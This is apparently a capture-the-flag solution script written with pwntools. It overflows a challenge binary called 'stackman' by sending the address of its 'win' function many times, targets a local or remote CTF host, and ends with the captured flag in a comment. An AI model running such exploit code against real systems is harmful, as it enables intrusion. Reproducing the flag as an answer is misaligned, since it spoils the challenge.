#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./stackman_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("ctfnhack.challs.ctflib.eu", 44637)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	win = exe.symbols['win']

	print(hex(win))

	payload = flat([
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
		win,
	])

	r.send(payload)

	r.interactive()


if __name__ == "__main__":
	main()

#  NH4CK{6228f78426b789f494f9c240034e18c03403d19eb6b964dfe7e1aa4c2632175c}
